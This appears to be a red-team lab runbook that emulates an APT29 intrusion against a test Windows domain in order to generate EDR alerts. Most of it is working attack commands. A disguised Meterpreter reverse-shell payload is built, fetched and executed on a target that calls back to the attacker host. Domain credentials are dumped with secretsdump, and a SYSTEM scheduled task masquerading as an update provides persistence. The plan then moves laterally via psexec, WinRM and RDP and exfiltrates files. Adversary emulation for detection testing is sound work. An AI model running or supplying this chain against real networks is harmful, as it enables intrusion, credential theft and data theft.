# APT29 Scenario 1: Execution Plan

See `README.md` for overview and ATT&CK mapping. This document has the step-by-step commands.

---

## Infrastructure Setup

### On MORPHEUS (Attacker, Kali Linux)

**Install dependencies**
```bash
apt update && apt install -y metasploit-framework python3 python3-pip
pip install impacket
gem install evil-winrm
```

**Create working directories**
```bash
mkdir -p /home/kali/apt29_scenario1/{payloads,loot,logs}
cd /home/kali/apt29_scenario1
```

### On TRINITY/NEO/NEB/ZION (Windows targets)

- Domain-joined to `corp.lab`
- Admin credentials: `Administrator` / `<LAB_ADMIN_PASSWORD>`
- Time synchronized (critical for Kerberos)
- Vision One agent monitoring

---

## Pre-Execution Checklist

- [ ] All VMs network connectivity verified (ping each other)
- [ ] Time synchronized across all hosts
- [ ] STEP 0 test files created (see below)
- [ ] Port scan: `nmap -p 135,139,445,3389,5985,5986 192.168.150.21 192.168.150.10` 
- [ ] Meterpreter listener ready

---

## STEP 0: Create Test Files

Simulate sensitive data that will be "exfiltrated."

### On TRINITY
```powershell
$docPath = "C:\Users\Administrator\Documents"
mkdir $docPath -Force

"Financial Report Q3" | Out-File "$docPath\Q3_Financial.xlsx"
"Exec Summary - Project Phoenix" | Out-File "$docPath\Executive_Summary.docx"
"Service Agreement 2026" | Out-File "$docPath\Vendor_Contract.pdf"

dir $docPath\*
```

### On NEO
```powershell
$docPath = "C:\Users\Administrator\Documents"
mkdir $docPath -Force

"Payroll Data 2025" | Out-File "$docPath\Payroll_2025.xlsx"
"HR Policies & Benefits" | Out-File "$docPath\HR_Policies.docx"
"Employee Directory" | Out-File "$docPath\Employee_Directory.pdf"

dir $docPath\*
```

### On NEB
```powershell
$sharedPath = "C:\shared"
mkdir $sharedPath -Force

"Q4 Marketing Strategy" | Out-File "$sharedPath\Marketing_Strategy.docx"
"Customer Accounts" | Out-File "$sharedPath\Customer_List.xlsx"
"Product Roadmap 2026" | Out-File "$sharedPath\Roadmap_2026.pdf"

dir $sharedPath\*
```

### On ZION (DC)
```powershell
$docPath = "C:\Users\Administrator\Documents"
mkdir $docPath -Force

"AD Infrastructure" | Out-File "$docPath\AD_Infrastructure.docx"
"Service Accounts" | Out-File "$docPath\Service_Accounts.xlsx"
"Network Topology" | Out-File "$docPath\Network_Topology.pdf"

dir $docPath\*
```

---

## STEP 1: Generate Payload & Start Listener

### On MORPHEUS

**Generate Meterpreter payload**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.150.50 \
  LPORT=4443 \
  -f exe \
  -o /home/kali/apt29_scenario1/payloads/update.exe

ls -lh payloads/update.exe
```

**Start HTTP server** (new terminal)
```bash
cd payloads
python3 -m http.server 8080 &
```

**Start Meterpreter listener** (new terminal)
```bash
msfconsole -q -x "
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.150.50
set LPORT 4443
exploit -j
"
# Keep this running. Check: msf6 > jobs
```

---

## STEP 2: Initial Access on TRINITY

### Simulate macro execution (assume breach)

**On TRINITY, download and execute payload**
```powershell
cd C:\Windows\Temp

# Download payload from MORPHEUS
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.150.50:8080/update.exe' -OutFile update.exe"

# Verify
dir update.exe

# Execute
.\update.exe
```

**Expected result:** Beacon calls back to MORPHEUS (port 4443)

### On MORPHEUS, verify beacon
```bash
# In msfconsole
msf6 > sessions
# Should show: ID=1, meterpreter x64/windows, NT AUTHORITY\SYSTEM @ TRINITY
```

---

## STEP 3: Enumerate Domain

### From TRINITY Meterpreter session

```bash
msf6 > sessions -i 1  # Interact with session

# Enumerate domain users
shell
net user /domain
whoami
systeminfo
exit

# Enumerate domain groups
Get-ADGroup -Filter * | Select Name

# Enumerate network shares
net view /all

# List domain computers
Get-ADComputer -Filter * | Select Name
```

---

## STEP 4: Extract Domain Credentials

### From MORPHEUS, dump all domain creds

```bash
# secretsdump requires admin credentials
# Use the ones you already know: Administrator / <LAB_ADMIN_PASSWORD>

impacket-secretsdump -just-dc-user Administrator corp.lab/Administrator@192.168.150.22 -pwd-is-hash
# When prompted, use the Administrator NTLM hash OR plaintext password

# Extract all users (if you have admin access)
impacket-secretsdump -just-dc corp.lab/Administrator@192.168.150.22
```

**Save output** (you'll need the Administrator hash for lateral movement)

---

## STEP 5: Persistence on TRINITY

### Create scheduled task (TRINITY beacon)

```bash
# From TRINITY Meterpreter session
meterpreter > shell

# Create persistence task
schtasks /create /tn "MicrosoftUpdate" /tr "C:\Windows\Temp\update.exe" /sc ONLOGON /ru SYSTEM /rl highest /f

# Verify
schtasks /query /tn "MicrosoftUpdate" /v

exit
```

---

## STEP 6: Pre-Flight Check Before Lateral Movement

**CRITICAL:** Run this port sweep first to know which methods will work

```bash
# From MORPHEUS
nmap -p 135,139,445,3389,5985,5986 -Pn 192.168.150.21 192.168.150.10

# Interpreting results:
# 445 open   → psexec/wmiexec available (Method A/B)
# 135 open   → RPC available (needed for psexec)
# 5985 open  → WinRM available (Method C)
# 3389 open  → RDP available (Method D)
```

**Time sync check** (Kerberos breaks silently if time is off)
```bash
ntpdate -q 192.168.150.10  # DC
# Time difference should be <5 minutes
```

---

## STEP 7: Lateral Movement (Choose 1 Method)

You have 4 options. Pick based on what your port scan showed.

### Method A: impacket-psexec (if port 445 open)

```bash
# Test credentials first (will show "Pwn3d!" if successful)
crackmapexec smb 192.168.150.21 -u Administrator -p '<LAB_ADMIN_PASSWORD>'

# If successful, execute
impacket-psexec -hashes :NTLM_HASH corp.lab/Administrator@192.168.150.21 cmd.exe
# Or if using plaintext password:
impacket-psexec corp.lab/Administrator@192.168.150.21 cmd.exe

# At the remote shell:
C:\> whoami
# Should show: CORP\Administrator or NT AUTHORITY\SYSTEM

C:\> exit
```

### Method B: impacket-wmiexec (if 135/139 open)

```bash
impacket-wmiexec corp.lab/Administrator@192.168.150.21 cmd.exe
```

### Method C: evil-winrm (if 5985 open)

```bash
evil-winrm -i 192.168.150.21 -u Administrator -p '<LAB_ADMIN_PASSWORD>'

# At the PS prompt:
PS > whoami
PS > exit
```

### Method D: RDP + Manual GUI (if 3389 open)

```bash
# From any Windows host or use xfreerdp from MORPHEUS
xfreerdp /v:192.168.150.21 /u:Administrator /p:'<LAB_ADMIN_PASSWORD>'

# Manually execute payload on desktop
# download update.exe from 192.168.150.50:8080
# Execute
```

**Repeat for NEO (192.168.150.21) and ZION (192.168.150.10)**

---

## STEP 8: Check Beacon Sessions

```bash
msf6 > sessions

# Expected: 4 beacons total
# ID=1: TRINITY
# ID=2: NEO
# ID=3: NEB
# ID=4: ZION
```

---

## STEP 9: Persistence on NEO/NEB/ZION

### For each new beacon:

```bash
meterpreter > shell

schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\update.exe" /sc ONLOGON /ru SYSTEM /rl highest /f

exit
```

---

## STEP 10: Collection & Exfiltration

### From each beacon, collect documents

```bash
# On TRINITY beacon
meterpreter > download -r C:\Users\Administrator\Documents C:\trinity_docs.zip

# On NEO beacon
meterpreter > download -r C:\Users\Administrator\Documents C:\neo_docs.zip

# On NEB beacon (file server)
meterpreter > download -r C:\shared C:\neb_shared.zip

# On ZION beacon
meterpreter > download -r C:\Users\Administrator\Documents C:\zion_docs.zip
```

### Verify exfiltration on MORPHEUS

```bash
ls -lh /home/kali/apt29_scenario1/loot/
```

---

## Troubleshooting

### Beacon doesn't call back
- Check firewall (port 4443 outbound)
- Verify HTTP download succeeded (check C:\Windows\Temp\update.exe exists)
- Re-run: `.\update.exe`

### Lateral movement fails with "handle is invalid"
- **Time skew** — check time sync (run `ntpdate -q 192.168.150.10`)
- **Stale SMB session** — restart impacket command
- **Port not open** — re-run nmap to confirm

### Vision One not showing alerts
- Wait 2–5 minutes for telemetry ingestion
- Check agent is running: `Get-Service | grep Trend`
- Verify time sync (Vision One rejects out-of-sync events)

---

## Expected Outcome

✅ **STEP 1–5 (Core Chain):** 1–2 hours
- Initial access, discovery, credential extraction, persistence on TRINITY
- 10+ Vision One alerts across T1566, T1087, T1003, T1053, T1059

✅ **STEP 6–10 (Full Chain):** 2–3 hours total
- Lateral movement to all 3 targets
- 30+ alerts showing full kill chain
- Files exfiltrated to MORPHEUS

---

**For Training Use Only — Authorized Personnel Only**
